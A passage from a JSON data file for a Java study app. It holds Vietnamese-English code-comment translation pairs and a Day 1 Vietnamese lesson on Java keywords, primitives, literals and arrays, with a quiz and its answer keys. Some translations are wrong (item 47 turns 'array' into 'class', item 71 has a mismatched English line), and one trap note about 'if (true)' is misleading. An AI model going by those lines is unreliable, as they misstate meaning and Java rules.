      "en": "if value of ... is D, delete, else C, update"
    },
    {
      "id": 41,
      "vi": "Lấy dữ liệu của mảng đối tượng khi submit từ jsp lên form",
      "en": "Get data of object classes when submitting from jsp into form"
    },
    {
      "id": 42,
      "vi": "Thực hiện lấy dữ liệu combobox theo các giá trị được lấy phía trước",
      "en": "Get data of combobox by values taken before"
    },
    {
      "id": 43,
      "vi": "- Hàm kiểm tra 1 đối tượng có tồn tại ít nhát 1 thuộc tính rỗng",
      "en": "Function of checking 1 object which exists at least 1 property"
    },
    {
      "id": 44,
      "vi": "Xử lý sự kiện khi người dùng click vào button XXX",
      "en": "Process event when user clicks button XXX"
    },
    {
      "id": 45,
      "vi": "- Chuyển đổi biến A có kiểu dữ liệu  BBB  sang biến C có kiểu dữ liệu DDD",
      "en": "Convert variable A with BBB data type to variable C with DDD data type"
    },
    {
      "id": 46,
      "vi": "Lấy ra đối tượng với tham số truyền vào",
      "en": "Get objects with inputted parameter"
    },
    {
      "id": 47,
      "vi": "Tạo mới 1 mảng bằng cách cắt chuỗi với tham số truyền vào (split())",
      "en": "Create 1 class by cutting string with inputted parameter"
    },
    {
      "id": 48,
      "vi": "-Export danh sách student theo kết quả search được khi người dùng button xxx",
      "en": "Export student list by result of searching when user clicks button xxx"
    },
    {
      "id": 49,
      "vi": "-Hàm delete 1 đối tượng đang hiển thị trên màn hình  khi người dùng button xxx",
      "en": "Function of deleting1 object which show on screen when  user click button xxx"
    },
    {
      "id": 50,
      "vi": "-Hàm thực hiện lọc theo yes/no khi người dùng checke/uncheck vào checkbox",
      "en": "Function of filtering by yes/no when user chooses check/uncheck into checkbox"
    },
    {
      "id": 51,
      "vi": "Chuyển đến trang ABC khi người dùng click button xxx",
      "en": "forward to ABC page when user clicks button xxx"
    },
    {
      "id": 52,
      "vi": "kiểm tra 1 dòng dữ liệu tồn tại trong cơ sở dữ liệu  thỏa mãn điều kiện trận đấu đó là trận đấu  gần nhất của 1 cặp thi đấu",
      "en": "Check 1 data row which exists in database, satisfying match conditions"
    },
    {
      "id": 53,
      "vi": "Tìm những cặp đấu đã từng thi đấu  với nhau ít nhất 2 lần",
      "en": "Search matches which have at least 2 times of competitions"
    },
    {
      "id": 54,
      "vi": "So sánh ngày thi đấu gần nhất với ngày  chuẩn bị chèn vào cơ sở dữ liệu",
      "en": "Compare the nearest match date with the inserted date in database"
    },
    {
      "id": 55,
      "vi": "mã trận đấu nên theo định dạng sau  ( không bắt buộc)",
      "en": "Match code should be in following format (un-required)"
    },
    {
      "id": 56,
      "vi": "Nếu A lớn hơn hoặc bằng B thì thực hiện update ngược lại  thì thông báo lỗi",
      "en": "If A is greater than B,  update, else, report errors"
    },
    {
      "id": 57,
      "vi": "Nếu A thõa mãn các điều kiện validate thì sẽ xử lý add vào object ngược lại thì thông báo lỗi",
      "en": "If A satisfies conditions of validation, add into object, else, report errors"
    },
    {
      "id": 58,
      "vi": "láy danh sách bảng theo Id abc",
      "en": "get table list by id abc"
    },
    {
      "id": 59,
      "vi": "xóa bảng với điều kiện id= abc",
      "en": "Delete table if id=abc"
    },
    {
      "id": 60,
      "vi": "commnet cho hàm override ở actionclass",
      "en": "comment for override function at actionclass"
    },
    {
      "id": 61,
      "vi": "comment cho các hàm getter setter ở bean",
      "en": "comment for getter setter function at bean"
    },
    {
      "id": 62,
      "vi": "đếm số record ở database",
      "en": "Count number of record in database"
    },
    {
      "id": 63,
      "vi": "Tạo list A lấy từ database lên",
      "en": "Create list A from database"
    },
    {
      "id": 64,
      "vi": "Lấy danh sách từ DB và đẩy vào danh sách",
      "en": "Get data from database and show on list"
    },
    {
      "id": 65,
      "vi": "Kiểm tra dữ liệu đã tồn tại hay chưa ? Nếu có cho ra thông báo lỗi.",
      "en": "Check if [var] exists or not? If existed, show error notice"
    },
    {
      "id": 66,
      "vi": "Tạo biến A lấy dữ liệu từ B",
      "en": "Create variable with data from B"
    },
    {
      "id": 67,
      "vi": "Xử lý điều hướng cho action A",
      "en": "Process navigation for action A"
    },
    {
      "id": 68,
      "vi": "Kiểm tra kết nối dữ liệu",
      "en": "Function of checking data connection"
    },
    {
      "id": 69,
      "vi": "Hiển thị lớp theo mã trường",
      "en": "Function of showing classes by school code"
    },
    {
      "id": 70,
      "vi": "Hàm kiểm tra tồn tại của trường bắt buộc nhập",
      "en": "Function of checking existion of required inputting field"
    },
    {
      "id": 71,
      "vi": "Hàm kiểm tra tồn tại của trường bắt buộc nhập",
      "en": "Check data by row on form"
    },
    {
      "id": 72,
      "vi": "Hiển thị lỗi nếu ngày bắt đầu lớn hơn ngày kết thúc",
      "en": "Show error message if Start date is greater than End date"
    },
    {
      "id": 73,
      "vi": "Lấy dữ liệu trường id từ form",
      "en": "Get data of ID field from form"
    },
    {
      "id": 74,
      "vi": "Lấy tất cả danh sách dữ liệu có trong cơ sở dữ liệu",
      "en": "Get all data list from database"
    },
    {
      "id": 75,
      "vi": "lấy giá trị của phương thức X gán vào biến Y",
      "en": "Set value of method X for variable Y"
    },
    {
      "id": 76,
      "vi": "Hiển thị message lỗi trên khu vực thông báo lỗi với nội dung:  Ngày sinh không hợp lệ. Vui lòng nhập ngày có format XYZ.",
      "en": "Show error message on error message area with content: Invalid birthday, please input the date with XYZ format ."
    },
    {
      "id": 77,
      "vi": "Nếu A>B thì tiến hành update thông tin học sinh. Ngược lại hãy xử lí thêm mới thông tin học sinh.",
      "en": "If A>B, update student information, else, add student information."
    },
    {
      "id": 78,
      "vi": "Đếm số record thõa mãn điều kiện abc. Nếu số record trả về lớn hơn Y thì hãy hiển thị thông tin xyz lên màn hình.",
      "en": "Count records which satisfy abc condition. If number of returned records is greater than Y, show information xyz on screen."
    },
    {
      "id": 79,
      "vi": "Nếu giá trị nhập vào của item A là xxx thì hãy chuyển đổi thành yyy, sau đó đăng kí vào database với định dạng zzz.",
      "en": "If inputted value of item A is xxx, convert to yyy, then register into database with zzz format."
    }
  ],
  "dailyLessons": {
    "1": {
      "day": 1,
      "week": 1,
      "chapter": "Chapter 1: Language Fundamentals",
      "title": "Language Fundamentals - Nền Tảng Cú Pháp & Nhận Diện Cạm Bẫy",
      "estimatedTime": "3h 30m",
      "difficulty": "⭐⭐",
      "priority": "🔴 MUST KNOW (Trọng Tâm Cốt Lõi Entry Test)",
      "source": "Sun Certified Programmer for Java 2 Study Guide (Ch01.pdf) & TestKing",
      "objectives": [
        "Nắm vững 49 Java Keywords và phân biệt tuyệt đối với Literals (true, false, null) và các từ mượn C/C++.",
        "Xác định chính xác định danh (Identifiers) hợp lệ và không hợp lệ dưới mọi bẫy cú pháp.",
        "Thuộc lòng kích thước bit, khoảng giá trị (range) và giá trị mặc định của 8 kiểu nguyên thủy (Primitives).",
        "Làm chủ cách biểu diễn Literals: Thập phân, Bát phân (Octal '0'), Thập lục phân (Hex '0x'), Float/Double suffixes.",
        "Hiểu sâu quy tắc Definite Assignment: Biến cục bộ (Stack) vs Biến đối tượng (Heap) và giá trị mặc định.",
        "Khai báo, khởi tạo mảng (Arrays) 1 chiều, đa chiều, mảng nặc danh và bẫy ArrayIndexOutOfBoundsException.",
        "Giải phẫu chữ ký phương thức main() và mảng tham số dòng lệnh String[] args."
      ],
      "whyMatters": "Mọi bài thi Java Entry Test (đặc biệt là dạng TestKing) đều cài cắm ít nhất 3-5 câu hỏi kiểm tra tính hợp lệ của cú pháp, tràn số (overflow), biến chưa khởi tạo hoặc mảng. Nắm chắc ngày 1 giúp bạn loại bỏ ngay các lỗi mất điểm ngớ ngẩn!",
      "prerequisites": "Kiến thức lập trình căn bản (khái niệm biến, kiểu dữ liệu, hàm).",
      "parts": [
        {
          "id": "partA",
          "title": "Part A: Java Keywords & Identifiers",
          "sourceRef": "SCJP Objective 4.4 (Ch01.pdf, Page 3-6)",
          "theory": "\nTrong Java, có **49 từ khóa dự lưu (Reserved Keywords)** được định nghĩa trong ngôn ngữ.\nTất cả các từ khóa đều viết bằng chữ thường (**lowercase**). Nếu viết hoa như `Abstract`, `Final` thì đó là tên hợp lệ chứ KHÔNG PHẢI keyword!\n\n#### ⚠️ 3 Từ Cực Dễ Bị Nhầm Là Keyword:\n- `true`, `false`, `null`: Đây là các **Literals** (giá trị hằng), KHÔNG PHẢI là keyword. Nhưng bạn **TUYỆT ĐỐI KHÔNG ĐƯỢC** sử dụng chúng làm tên định danh (identifier).\n\n#### ⚠️ Các từ mượn C/C++ (Kẻ mạo danh trong đề thi):\n- Đề thi rất thích đưa các từ như: `sizeof`, `unsigned`, `virtual`, `friend`, `include`, `overload`.\n- **Nguyên tắc vàng:** \"Java is not C++!\" — Các từ này hoàn toàn không tồn tại trong Java.\n\n#### ⚠️ 2 Từ khóa dự lưu chưa sử dụng (Reserved Unused Keywords):\n- `const`, `goto`: Java không dùng 2 từ này trong cú pháp, nhưng chúng vẫn là Reserved Keywords nhằm ngăn ngừa lập trình viên C/C++ dùng chúng làm tên biến.\n\n#### 4 Quy Tắc Đặt Tên Định Danh Hợp Lệ (Legal Identifiers):\n1. Ký tự đầu tiên **chỉ có thể là:** Chữ cái (Unicode), dấu gạch dưới `_`, hoặc ký hiệu tiền tệ `$`. **TUYỆT ĐỐI KHÔNG BẮT ĐẦU BẰNG SỐ**.\n2. Các ký tự tiếp theo có thể là: Chữ cái, số, `_`, `$`.\n3. Không giới hạn độ dài.\n4. Phân biệt chữ hoa/thường (`Foo` khác `foo`). Không được trùng với Keyword hoặc Literals (`null`, `true`, `false`).\n            ",
          "legalExamples": [
            {
              "name": "_variable",
              "why": "Bắt đầu bằng dấu gạch dưới hợp lệ."
            },
            {
              "name": "$money",
              "why": "Bắt đầu bằng ký hiệu tiền tệ $ hợp lệ."
            },
            {
              "name": "______123",
              "why": "Chứa dấu gạch dưới và số sau đó."
            },
            {
              "name": "this_is_a_very_long_legal_identifier",
              "why": "Không giới hạn độ dài."
            },
            {
              "name": "MAX_VALUE",
              "why": "Quy tắc đặt tên hằng số chuẩn."
            },
            {
              "name": "True",
              "why": "Chữ T hoa nên không trùng literal 'true' (tuy nhiên không khuyến khích)."
            },
            {
              "name": "nullValue",
              "why": "Chỉ chứa 'null' ở phần đầu, không trùng hoàn toàn."
            },
            {
              "name": "x123",
              "why": "Số nằm phía sau chữ cái."
            },
            {
              "name": "über",
              "why": "Hỗ trợ ký tự Unicode chữ cái quốc tế."
            },
            {
              "name": "$",
              "why": "Chỉ 1 ký tự $ vẫn hoàn toàn hợp lệ."
            }
          ],
          "illegalExamples": [
            {
              "name": "123user",
              "why": "COMPILE ERROR: Bắt đầu bằng chữ số."
            },
            {
              "name": "true",
              "why": "COMPILE ERROR: Trùng với boolean literal."
            },
            {
              "name": "null",
              "why": "COMPILE ERROR: Trùng với literal null."
            },
            {
              "name": "goto",
              "why": "COMPILE ERROR: Trùng với reserved keyword."
            },
            {
              "name": "my-var",
              "why": "COMPILE ERROR: Dấu gạch ngang '-' bị hiểu là phép toán trừ."
            },
            {
              "name": "user#id",
              "why": "COMPILE ERROR: Ký tự '#' không hợp lệ trong Java identifier."
            },
            {
              "name": "new",
              "why": "COMPILE ERROR: Trùng với từ khóa khởi tạo new."
            },
            {
              "name": "first name",
              "why": "COMPILE ERROR: Chứa khoảng trắng."
            },
            {
              "name": "a/b",
              "why": "COMPILE ERROR: Chứa ký tự phép chia '/'."
            },
            {
              "name": "class",
              "why": "COMPILE ERROR: Trùng với từ khóa khai báo class."
            }
          ]
        },
        {
          "id": "partB",
          "title": "Part B: 8 Kiểu Nguyên Thủy (Primitives) & Bộ Nhớ",
          "sourceRef": "SCJP Objective 4.5 (Ch01.pdf, Page 11-14)",
          "theory": "\nJava định nghĩa **8 kiểu dữ liệu nguyên thủy (Primitive Types)** độc lập với kiến trúc phần cứng bên dưới.\n\n### Bảng Tra Cứu Toàn Diện 8 Kiểu Primitives:\n| Kiểu | Kích thước bit | Byte | Khoảng giá trị (Range) | Default Value | Wrapper Class |\n| :--- | :--- | :--- | :--- | :--- | :--- |\n| `byte` | 8 bits | 1 byte | **-128 đến 127** ($-2^7$ đến $2^7-1$) | `0` | `Byte` |\n| `short` | 16 bits | 2 bytes | **-32,768 đến 32,767** ($-2^{15}$ đến $2^{15}-1$) | `0` | `Short` |\n| `int` | 32 bits | 4 bytes | **-2,147,483,648 đến 2,147,483,647** | `0` | `Integer` |\n| `long` | 64 bits | 8 bytes | $-2^{63}$ đến $2^{63}-1$ (Cần hậu tố `L` hoặc `l`) | `0L` | `Long` |\n| `float` | 32 bits | 4 bytes | Số thực 32-bit IEEE 754 (Bắt buộc hậu tố `f`/`F`) | `0.0f` | `Float` |\n| `double` | 64 bits | 8 bytes | Số thực 64-bit IEEE 754 (Mặc định cho số thập phân) | `0.0d` | `Double` |\n| `char` | 16 bits | 2 bytes | **0 đến 65,535** (`\\u0000` đến `\\uffff`) **(Số nguyên không dấu!)** | `\\u0000` | `Character` |\n| `boolean`| Không xác định | - | Chỉ nhận 2 giá trị: `true` hoặc `false` | `false` | `Boolean` |\n\n#### Điểm Cần Khắc Cốt Ghi Tâm:\n1. `char` là kiểu số nguyên **duy nhất không có dấu (unsigned)** trong Java. Range: $0$ đến $2^{16}-1$.\n2. `boolean` trong Java **KHÔNG THỂ ÉP KIỂU SANG SỐ** và ngược lại! Không có chuyện `if(1)` như C++.\n3. Mọi số nguyên literal viết trong code mặc định là kiểu `int`.\n4. Mọi số thập phân literal viết trong code mặc định là kiểu `double`.\n            ",
          "code": "// Khảo sát ép kiểu và khoảng giá trị\nbyte b1 = 127; // Max byte\n// byte b2 = 128; // COMPILE ERROR: possible loss of precision (vượt quá 127)\nbyte b3 = (byte) 128; // OK ép kiểu: tràn số sang -128\n\n// float f1 = 3.14; // COMPILE ERROR: 3.14 mặc định là double\nfloat f2 = 3.14f; // OK\nfloat f3 = (float) 3.14; // OK ép kiểu\n\nchar c1 = 'A';\nchar c2 = 65; // 'A' trong mã ASCII\nchar c3 = '\\u0041'; // 'A' trong mã Unicode\n// char c4 = -1; // COMPILE ERROR: char không nhận số âm trực tiếp!"
        },
        {
          "id": "partC",
          "title": "Part C: Literals (Hệ Số & Cạm Bẫy Biểu Diễn)",
          "sourceRef": "SCJP Objective 4.5 (Ch01.pdf, Page 15-20)",
          "theory": "\n### 1. Integer Literals trong các Hệ Cơ Số:\n- **Hệ Thập phân (Decimal):** Viết bình thường, ví dụ `10`, `100`.\n- **Hệ Bát phân (Octal):** Bắt đầu bằng chữ số `0` (chỉ gồm các chữ số từ `0` đến `7`).\n  - Ví dụ: `int x = 012;` $\\rightarrow$ Hệ 10 là: $1 \\times 8^1 + 2 \\times 8^0 = 10$.\n  - Bẫy: `int y = 08;` $\\rightarrow$ **COMPILE ERROR** vì số 8 không tồn tại trong hệ bát phân!\n- **Hệ Thập lục phân (Hexadecimal):** Bắt đầu bằng `0x` hoặc `0X` (gồm các chữ số 0-9 và A-F/a-f).\n  - Ví dụ: `int h = 0x1A;` $\\rightarrow$ $1 \\times 16^1 + 10 \\times 16^0 = 26$.\n\n### 2. Floating-Point Literals:\n- Mặc định là `double`. Muốn là `float` bắt buộc có `F` hoặc `f`.\n- Dạng số khoa học: `double d = 1.23e2;` nghĩa là $1.23 \\times 10^2 = 123.0$.\n\n### 3. Char vs String Literals:\n- `char`: Dấu nháy đơn `'A'`, `'\n'`, `'\\u0041'`.\n- `String`: Dấu nháy kép `\"A\"`. Lưu ý: `'A'` là primitive 16-bit, còn `\"A\"` là đối tượng Object trên Heap!\n            ",
          "code": "int dec = 15;\nint oct = 017;   // 1*8 + 7 = 15\nint hex = 0x0F;  // 15\nSystem.out.println(dec == oct); // true!\nSystem.out.println(oct == hex); // true!\n\n// int badOct = 078; // COMPILE ERROR: Chữ số 8 không hợp lệ trong bát phân!"
        },
        {
          "id": "partD",
          "title": "Part D: Variables, Scope & Definite Assignment",
          "sourceRef": "SCJP Objective 1.2 (Ch01.pdf, Page 22-26)",
          "theory": "\n### 3 Loại Biến Trong Java:\n1. **Instance Variables (Thuộc tính đối tượng):** Khai báo trong class nhưng ngoài method. Được cấp phát trên **Heap** khi gọi `new`. Tự động nhận giá trị mặc định.\n2. **Static/Class Variables (Biến tĩnh):** Khai báo với từ khóa `static`. Cấp phát khi Class được nạp vào bộ nhớ. Tự động nhận giá trị mặc định.\n3. **Local Variables (Biến cục bộ):** Khai báo bên trong method, constructor hoặc block `{}`. Cấp phát trên bộ nhớ **Stack**.\n\n### ⚠️ QUY TẮC DEFINITE ASSIGNMENT:\n- Biến cục bộ **TUYỆT ĐỐI KHÔNG CÓ GIÁ TRỊ MẶC ĐỊNH**.\n- Bạn có thể khai báo một biến cục bộ mà chưa gán giá trị, NHƯNG nếu đọc biến đó khi chưa chắc chắn nó đã được gán $\\rightarrow$ **COMPILE ERROR**.\n- Trình biên dịch (javac) chỉ kiểm tra luồng tĩnh: Nếu gán biến bên trong `if` mà không có `else`, compiler không đảm bảo biến luôn được gán $\\rightarrow$ Báo lỗi!\n            ",
          "code": "public class VariableScopeDemo {\n    int instanceX; // Heap -> default = 0\n    static boolean staticFlag; // Method Area -> default = false\n\n    public void testMethod(boolean condition) {\n        int localY; // Stack -> KHÔNG CÓ DEFAULT!\n        \n        // System.out.println(localY); // COMPILE ERROR: localY might not have been initialized!\n        \n        if (condition) {\n            localY = 10;\n        } else {\n            localY = 20;\n        }\n        System.out.println(localY); // HỢP LỆ: Vì có đầy đủ if-else đảm bảo luôn được gán!\n    }\n}"
        },
        {
          "id": "partE",
          "title": "Part E: Arrays (Declaration, Construction & Initialization)",
          "sourceRef": "SCJP Objective 1.1 (Ch01.pdf, Page 27-35)",
          "theory": "\nTrong Java, **MẢNG LUÔN LÀ MỘT ĐỐI TƯỢNG (OBJECT)** trên Heap, bất kể mảng chứa kiểu nguyên thủy hay kiểu đối tượng.\n\n### 1. Khai báo (Declaration):\n- `int[] a;` hoặc `int a[];` hoặc `int []a;` (cả 3 đều hợp lệ).\n- Bẫy thi: **CẤM GHI KÍCH THƯỚC TRONG DẤU NGOẶC VUÔNG LÚC KHAI BÁO**:\n  `int[5] a;` $\\rightarrow$ **COMPILE ERROR**.\n\n### 2. Khởi tạo (Construction) bằng từ khóa `new`:\n- `int[] a = new int[5];` $\\rightarrow$ Tạo mảng chứa 5 phần tử trên Heap, chỉ số từ $0$ đến $4$.\n- Các phần tử trong mảng **LUÔN ĐƯỢC TỰ ĐỘNG GÁN GIÁ TRỊ MẶC ĐỊNH** (kể cả mảng khai báo cục bộ trong method!).\n  - Mảng `int[]`: các phần tử là `0`.\n  - Mảng `boolean[]`: các phần tử là `false`.\n  - Mảng `String[]` hoặc `Thread[]`: các phần tử là `null`.\n\n### 3. Mảng các Đối Tượng (Array of Object References):\n- `Thread[] threads = new Thread[5];`\n  - Đã tạo ra: **1 đối tượng mảng duy nhất** trên Heap có độ dài 5.\n  - Đã tạo ra: **5 biến tham chiếu** mang giá trị `null`.\n  - **CHƯA CÓ BẤT KỲ ĐỐI TƯỢNG THREAD NÀO ĐƯỢC TẠO RA!**\n\n### 4. Bẫy length vs length():\n- Thuộc tính mảng: `arr.length` (là field thuộc tính, **không có ngoặc tròn**).\n- Phương thức của chuỗi: `str.length()` (có ngoặc tròn).\n            ",
          "code": "int[] numbers = new int[3];\nSystem.out.println(numbers[0]); // In ra 0 (Default value hợp lệ)\nSystem.out.println(numbers.length); // In ra 3\n\n// System.out.println(numbers[3]); // RUNTIME EXCEPTION: ArrayIndexOutOfBoundsException!\n\nString[] names = new String[2];\nSystem.out.println(names[0]); // In ra null (Không ném exception)\n// System.out.println(names[0].length()); // RUNTIME EXCEPTION: NullPointerException!"
        },
        {
          "id": "partF",
          "title": "Part F: main() Method & Command-Line Arguments",
          "sourceRef": "SCJP Objective 4.2 (Ch01.pdf, Page 36-39)",
          "theory": "\n### 1. Chữ ký hợp lệ của phương thức main:\n- `public static void main(String[] args)`\n- Có thể đổi thứ tự: `static public void main(String[] args)`\n- Tên tham số mảng đổi tùy ý: `String[] anyName`\n- Từ Java 5 có thể dùng Varargs: `public static void main(String... args)`\n\n### 2. Khác biệt cốt lõi Java vs C/C++ về mảng `args`:\n- Trong C/C++: `argv[0]` là tên chương trình.\n- Trong Java: `args[0]` là **tham số đầu tiên người dùng truyền vào sau tên class**! Tên file/class không được tính vào `args`.\n- Nếu chạy: `java MyApp hello world`\n  - `args.length` bằng `2`.\n  - `args[0]` là `\"hello\"`.\n  - `args[1]` là `\"world\"`.\n- Nếu chạy: `java MyApp` (không truyền tham số gì):\n  - `args.length` bằng `0` (mảng rỗng, khác `null`).\n  - Gọi `args[0]` sẽ ném ra **`ArrayIndexOutOfBoundsException`**.\n            ",
          "code": "public class MainArgsDemo {\n    public static void main(String[] args) {\n        System.out.println(\"Số tham số: \" + args.length);\n        if (args.length > 0) {\n            System.out.println(\"Tham số đầu tiên: \" + args[0]);\n        }\n    }\n}"
        }
      ],
      "codeTracing": [
        {
          "id": "ct1",
          "level": "Easy",
          "question": "Dự đoán kết quả in ra hoặc lỗi biên dịch của đoạn code sau:",
          "code": "public class Trace1 {\n    public static void main(String[] args) {\n        int []a, b[];\n        a = new int[3];\n        b = new int[3][3];\n        System.out.println(a.length + \" \" + b.length);\n    }\n}",
          "options": [
            "3 3",
            "Compile Error",
            "3 9",
            "Runtime Exception"
          ],
          "correctIndex": 0,
          "explanation": "Cú pháp `int []a, b[];` khai báo `a` là mảng 1 chiều `int[]`, còn `b` có thêm ngoặc vuông phía sau nên là mảng 2 chiều `int[][]`. Cả hai khởi tạo đều hợp lệ và thuộc tính `length` của mảng `b` là số hàng (3). Kết quả in ra là: 3 3."
        },
        {
          "id": "ct2",
          "level": "Medium",
          "question": "Đoạn code sau biên dịch hay chạy ra kết quả gì?",
          "code": "public class Trace2 {\n    static int x = 012;\n    public static void main(String[] args) {\n        int y = 0x12;\n        System.out.println(x + y);\n    }\n}",
          "options": [
            "24",
            "28",
            "Compile Error",
            "20"
          ],
          "correctIndex": 1,
          "explanation": "`x = 012` là hệ bát phân (Octal): 1*8 + 2 = 10. `y = 0x12` là hệ thập lục phân (Hex): 1*16 + 2 = 18. Phép cộng: 10 + 18 = 28!"
        },
        {
          "id": "ct3",
          "level": "Hard",
          "question": "Điều gì xảy ra khi biên dịch và chạy chương trình sau?",
          "code": "public class Trace3 {\n    public static void main(String[] args) {\n        String[] arr = new String[3];\n        for (int i = 0; i < arr.length; i++) {\n            System.out.print(arr[i] + \" \");\n        }\n    }\n}",
          "options": [
            "null null null ",
            "Compile Error",
            "ArrayIndexOutOfBoundsException",
            "In ra 3 dòng trống"
          ],
          "correctIndex": 0,
          "explanation": "Mảng các object `String[3]` được cấp phát trên Heap, mỗi phần tử tự động nhận default value là `null`. Vòng lặp duyệt từ 0 đến 2 và in ra `null null null ` hoàn toàn bình thường mà không bị lỗi NullPointerException (chỉ bị NPE nếu gọi phương thức trên phần tử null)."
        }
      ],
      "examTraps": [
        {
          "trap": "Bẫy 1: float f = 3.14;",
          "whyPeopleWrong": "Quên mất rằng mọi số thực có dấu chấm thập phân trong Java mặc định là kiểu double (64-bit).",
          "wrongThinking": "Nghĩ rằng 3.14 là số nhỏ nên tự động vừa với biến float 32-bit.",
          "correctRule": "Gán số thực literal cho float bắt buộc phải thêm chữ 'f' hoặc ép kiểu (float) 3.14.",
          "code": "float f1 = 3.14f; // Đúng\n// float f2 = 3.14; // COMPILE ERROR!",
          "miniCheck": "Biểu thức `double d = 3.14f;` có hợp lệ không? -> Có, vì float tự động nâng kiểu lên double an toàn."
        },
        {
          "trap": "Bẫy 2: Biến cục bộ trong nhánh if không có else",
          "whyPeopleWrong": "Nhìn bằng mắt thường thấy điều kiện chắc chắn đúng lúc runtime nên nghĩ compiler sẽ cho qua.",
          "wrongThinking": "Cho rằng javac hiểu được logic thời gian chạy của chương trình.",
          "correctRule": "Java Compiler kiểm tra Definite Assignment theo cây cú pháp tĩnh. Nếu biến cục bộ không được gán ở mọi nhánh rẽ có thể, nó bị coi là uninitialized.",
          "code": "int x;\nif (true) { x = 1; }\n// System.out.println(x); // Vẫn có thể bị compiler một số phiên bản bắt lỗi nếu không có else!",
          "miniCheck": "Làm sao để an toàn tuyệt đối với biến cục bộ? -> Luôn gán giá trị khởi tạo ban đầu khi khai báo (ví dụ `int x = 0;`)."
        },
        {
          "trap": "Bẫy 3: Tiền tố số 0 trong hệ bát phân (Octal Trap)",
          "whyPeopleWrong": "Tưởng số 0 ở đầu chỉ là số 0 vô nghĩa để căn lề cho đẹp (padding).",
          "wrongThinking": "Nghĩ rằng `int x = 010;` thì x bằng 10.",
          "correctRule": "Bất kỳ số nguyên nào bắt đầu bằng 0 đều là hệ bát phân (Octal). `010` trong hệ 8 bằng $1 \\times 8 = 8$ trong hệ 10.",
          "code": "int a = 010;\nSystem.out.println(a); // In ra 8!\nint b = 09; // COMPILE ERROR: 9 không tồn tại trong hệ 8!",
          "miniCheck": "Số `077` có giá trị thập phân bằng bao nhiêu? -> 7*8 + 7 = 63."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Nhận diện từ khóa và khoảng giá trị",
          "questions": [
            {
              "q": "Trong các từ sau: `byte`, `sizeof`, `unsigned`, `null`, `transient` - đâu là 2 Java Keywords hợp lệ?",
              "ans": "`byte` và `transient`."
            },
            {
              "q": "Khoảng giá trị của kiểu `byte` là từ bao nhiêu đến bao nhiêu?",
              "ans": "-128 đến 127."
            },
            {
              "q": "Giá trị mặc định của biến instance kiểu `char` là gì?",
              "ans": "'\\u0000' (null character, mã ASCII 0)."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Hiểu bản chất cấp phát bộ nhớ Stack vs Heap",
          "questions": [
            {
              "q": "Tại sao biến cục bộ không có giá trị mặc định trong khi instance variable lại có?",
              "ans": "Instance variable nằm trên Heap cùng object và được JVM xóa sạch về 0 lúc cấp phát; local variable nằm trên Stack frame ngắn hạn, Java yêu cầu lập trình viên gán giá trị tường minh để tránh đọc dữ liệu rác."
            },
            {
              "q": "Khai báo `Thread[] t = new Thread[5];` đã tạo ra bao nhiêu thread object?",
              "ans": "0 thread object (chỉ tạo 1 mảng chứa 5 tham chiếu null)."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Đọc code và phân tích dòng chảy",
          "questions": [
            {
              "q": "Đoạn code: `int x = 5; int[] a = new int[x]; System.out.println(a[x-1]);` in ra gì?",
              "ans": "In ra 0 (phần tử cuối cùng của mảng kích thước 5 có index 4, nhận default value là 0)."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Nhận diện câu gài đề thi",
          "questions": [
            {
              "q": "Câu lệnh `int[5] arr;` bị lỗi gì?",
              "ans": "Compile Error: Không được chỉ định kích thước mảng ở phần khai báo."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Thử thách tổng hợp",
          "questions": [
            {
              "q": "Chương trình chạy lệnh `java Test a b c`. Trong hàm main, `args[0] + args[1]` in ra kết quả gì?",
              "ans": "'ab' (phép nối chuỗi String vì tham số dòng lệnh luôn là chuỗi)."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da1_1",
          "q": "Định danh nào sau đây là KHÔNG HỢP LỆ trong Java?",
          "options": [
            "$value",
            "_123",
            "2cool",
            "valid_name"
          ],
          "correct": 2,
          "exp": "Định danh trong Java không được bắt đầu bằng chữ số. '2cool' bắt đầu bằng số 2 nên bị Compile Error."
        },
        {
          "id": "da1_2",
          "q": "Từ nào sau đây KHÔNG PHẢI là từ khóa (keyword) trong Java?",
          "options": [
            "volatile",
            "assert",
            "strictfp",
            "sizeof"
          ],
          "correct": 3,
          "exp": "'sizeof' là toán tử của ngôn ngữ C/C++, hoàn toàn không tồn tại trong Java."
        },
        {
          "id": "da1_3",
          "q": "Giá trị của biểu thức `byte b = (byte) 130;` là bao nhiêu?",
          "options": [
            "130",
            "-126",
            "-128",
            "Compile Error"
          ],
          "correct": 1,
          "exp": "Khoảng của byte là -128 đến 127. Khi ép kiểu 130 (127 + 3), số sẽ bị tràn vòng tròn: 127 -> -128 -> -127 -> -126."
        },
        {
          "id": "da1_4",
          "q": "Biến cục bộ trong phương thức nếu không được gán giá trị thì có giá trị mặc định là gì?",
          "options": [
            "0",
            "null",
            "false",
            "Không có giá trị mặc định, dùng sẽ lỗi biên dịch"
          ],
          "correct": 3,
          "exp": "Biến cục bộ (local variable) trên Stack không có giá trị mặc định và phải khởi tạo trước khi dùng."
        },
        {
          "id": "da1_5",
          "q": "Số nguyên `0x1F` trong hệ thập lục phân tương ứng với số thập phân nào?",
          "options": [
            "15",
            "31",
            "25",
            "16"
          ],
          "correct": 1,
          "exp": "0x1F = 1 * 16^1 + 15 * 16^0 = 16 + 15 = 31."
        },
        {
          "id": "da1_6",
          "q": "Đoạn mã sau: `float f = 1.0;` sẽ:",
          "options": [
            "Biên dịch bình thường",
            "Compile Error vì 1.0 mặc định là double",
            "In ra 1.0",
            "Runtime Exception"
          ],
          "correct": 1,
          "exp": "1.0 là double literal, không thể gán ngầm định cho float mà thiếu hậu tố 'f' hoặc ép kiểu."
        },
        {
          "id": "da1_7",
          "q": "Mảng `int[] arr = new int[5];` có phần tử hợp lệ cuối cùng ở chỉ số nào?",
          "options": [
            "arr[5]",
            "arr[4]",
            "arr[1]",
            "arr[6]"
          ],
          "correct": 1,
          "exp": "Mảng 5 phần tử có chỉ số từ 0 đến 4. Truy cập arr[5] sẽ ném ArrayIndexOutOfBoundsException."
        },
        {
          "id": "da1_8",
          "q": "Nếu chạy lệnh `java Demo hello`, biểu thức `args.length` trong hàm main có giá trị là:",
          "options": [
            "1",
            "2",
            "0",
            "null"
          ],
          "correct": 0,
